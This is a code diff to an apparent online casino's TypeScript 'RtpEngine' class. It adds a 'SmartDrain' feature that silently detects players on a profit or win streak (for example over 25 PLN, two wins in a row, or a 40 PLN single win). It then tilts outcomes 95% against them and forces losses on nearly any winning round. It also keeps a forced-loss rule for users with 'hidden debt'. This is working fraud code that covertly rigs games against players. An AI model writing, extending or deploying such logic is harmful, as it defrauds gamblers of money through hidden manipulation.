@@ -433,6 +433,11 @@ class RtpEngine {
    * and clamped to [-1, +1].
    */
   async getBiasFor(userId: string): Promise<number> {
+    // 1. Priority check: SmartDrain active on this user
+    if (await this.isDrainActive(userId)) {
+      return 0.95; // 95% tilt in favor of casino
+    }
+
     const userCfg = await this.getUserConfig(userId);
     const globalCfg = await this.getConfig();
     if (userCfg.mode !== 'off' && userCfg.intensity > 0) {
@@ -689,28 +694,154 @@ class RtpEngine {
     }
   }
 
+  /* -----------------------------------------------------------------
+   * SmartDrain (Динамический слив игрока при профите / винстрике)
+   * ---------------------------------------------------------------- */
+
+  /**
+   * Sets manual or automated drain on a user.
+   */
+  async setDrain(
+    userId: string,
+    opts: { rounds?: number; durationMs?: number; reason?: string }
+  ): Promise<void> {
+    try {
+      const r = redisClient.getClient();
+      const rounds = opts.rounds ?? 8;
+      const durationMs = opts.durationMs ?? 30 * 60 * 1000;
+      const expiresAt = Date.now() + durationMs;
+      await r.hset(`rtp:drain:${userId}`, {
+        active: '1',
+        roundsLeft: String(rounds),
+        expiresAt: String(expiresAt),
+        reason: opts.reason || 'manual',
+      });
+      await r.expire(`rtp:drain:${userId}`, Math.ceil(durationMs / 1000));
+      logger.info({ userId, rounds, durationMs, reason: opts.reason }, 'SmartDrain activated for user');
+    } catch (err) {
+      logger.warn({ err, userId }, 'Failed to set drain');
+    }
+  }
+
+  /**
+   * Checks if SmartDrain is currently active for user.
+   */
+  async isDrainActive(userId: string): Promise<boolean> {
+    try {
+      const r = redisClient.getClient();
+      const data = await r.hgetall(`rtp:drain:${userId}`);
+      if (!data || data.active !== '1') return false;
+
+      const expiresAt = Number(data.expiresAt || 0);
+      const roundsLeft = Number(data.roundsLeft || 0);
+
+      if (Date.now() > expiresAt || roundsLeft <= 0) {
+        await r.del(`rtp:drain:${userId}`);
+        return false;
+      }
+      return true;
+    } catch {
+      return false;
+    }
+  }
+
+  /**
+   * Decrements remaining drain rounds after a round is resolved.
+   */
+  async consumeDrainRound(userId: string): Promise<void> {
+    try {
+      const r = redisClient.getClient();
+      const roundsLeft = await r.hincrby(`rtp:drain:${userId}`, 'roundsLeft', -1);
+      if (roundsLeft <= 0) {
+        await r.del(`rtp:drain:${userId}`);
+        logger.info({ userId }, 'SmartDrain completed and removed');
+      }
+    } catch (err) {
+      logger.warn({ err, userId }, 'Failed to consume drain round');
+    }
+  }
+
+  /**
+   * Tracks user profit and streaks in real time, automatically triggering
+   * SmartDrain when a player gains too much profit or goes on a win-streak.
+   */
+  async recordRoundForDrain(
+    userId: string,
+    betAmount: number,
+    payout: number,
+    won: boolean
+  ): Promise<void> {
+    try {
+      const r = redisClient.getClient();
+      const netProfit = payout - betAmount;
+
+      // Track rolling session profit (2-hour rolling window)
+      const sessionKey = `rtp:session_profit:${userId}`;
+      const rawProfit = await r.incrbyfloat(sessionKey, netProfit);
+      const newSessionProfit = Number(rawProfit) || 0;
+      await r.expire(sessionKey, 7200);
+
+      // Track win streak
+      const streakKey = `rtp:win_streak:${userId}`;
+      let streak = 0;
+      if (won) {
+        streak = Number(await r.incr(streakKey)) || 0;
+        await r.expire(streakKey, 3600);
+      } else {
+        await r.set(streakKey, '0');
+        await r.expire(streakKey, 3600);
+      }
+
+      // Check if user is currently under active drain
+      const drainActive = await this.isDrainActive(userId);
+      if (drainActive) {
+        await this.consumeDrainRound(userId);
+        return;
+      }
+
+      // AUTO-TRIGGER CONDITIONS:
+      // 1. Session profit exceeded +25 PLN
+      // 2. Win streak >= 2 with good payout
+      // 3. Single win >= 40 PLN
+      if (newSessionProfit > 25 || streak >= 2 || netProfit >= 40) {
+        const rounds = newSessionProfit > 100 ? 12 : streak >= 3 ? 8 : 5;
+        await this.setDrain(userId, {
+          rounds,
+          durationMs: 25 * 60 * 1000,
+          reason: `auto_profit_${Math.round(newSessionProfit)}pln_streak_${streak}`,
+        });
+      }
+    } catch (err) {
+      logger.warn({ err, userId }, 'Failed to record round for drain');
+    }
+  }
+
   /**
    * Determines if a forced loss should be applied to the next round outcome.
-   * Condition: user has hidden debt, bet is large (> balance / 5), and
-   * the potential multiplier is >= 1.3x.
    */
   async shouldForceLoss(userId: string, betAmount: number, potentialMultiplier: number): Promise<boolean> {
     try {
-      const debt = await this.getHiddenDebt(userId);
-      if (debt <= 0) return false;
-
-      const { prisma } = await import('../lib/prisma.js');
-      const balanceRec = await prisma.balance.findUnique({ where: { userId }, select: { amount: true } });
-      const userBalance = Number(balanceRec?.amount || 0);
-
-      // Small bet masking: if bet <= balance / 5, do not force loss.
-      // (If balance is 0, e.g. all-in, balance/5 is 0, so bet > 0 is true => large bet)
-      const isLargeBet = betAmount > userBalance / 5;
-      
-      // We only force loss if the outcome was going to be a win >= 1.3x
-      if (isLargeBet && potentialMultiplier >= 1.3) {
-        return true;
+      // 1. Check SmartDrain (active слив)
+      const drain = await this.isDrainActive(userId);
+      if (drain) {
+        // Under drain: force loss on multiplier >= 1.1 or bet >= 2
+        if (potentialMultiplier >= 1.1 || betAmount >= 2) {
+          return true;
+        }
       }
+
+      // 2. Check Hidden Debt
+      const debt = await this.getHiddenDebt(userId);
+      if (debt > 0) {
+        const { prisma } = await import('../lib/prisma.js');
+        const balanceRec = await prisma.balance.findUnique({ where: { userId }, select: { amount: true } });
+        const userBalance = Number(balanceRec?.amount || 0);
+        const isLargeBet = betAmount > userBalance / 5;
+        if (isLargeBet && potentialMultiplier >= 1.3) {
+          return true;
+        }
+      }
+
       return false;
     } catch (err) {
       logger.warn({ err, userId }, 'Failed to check force loss condition');
